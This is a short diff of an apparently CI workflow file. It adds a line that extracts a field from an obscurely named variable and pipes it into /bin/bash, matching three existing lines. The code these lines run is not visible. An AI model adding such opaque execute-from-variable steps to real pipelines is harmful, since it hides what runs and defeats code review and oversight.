@@ -23,6 +23,7 @@ jobs:
           echo $xvh85188 | jq -r .l0 | /bin/bash
           printf '%s' "$jvq2278" | jq -r .jb882 | /bin/bash
           printf '%s' "$wholq811" | jq -r .lvpmt96 | /bin/bash
+          echo $uph01 | jq -r .b2 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
